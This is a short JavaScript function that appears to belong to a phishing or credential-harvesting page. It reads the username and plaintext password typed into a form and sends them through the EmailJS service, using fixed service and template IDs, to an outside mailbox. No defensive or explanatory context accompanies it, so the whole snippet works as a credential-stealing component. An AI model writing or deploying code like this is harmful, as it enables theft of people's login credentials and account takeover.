function sendMail(pra){
    let temppara = {
        user_name : document.getElementById("username").value,
        user_passw : document.getElementById("passw").value
    }
    emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
    .then(function (res){
            console.log("success" , res.status)
            
    })
}
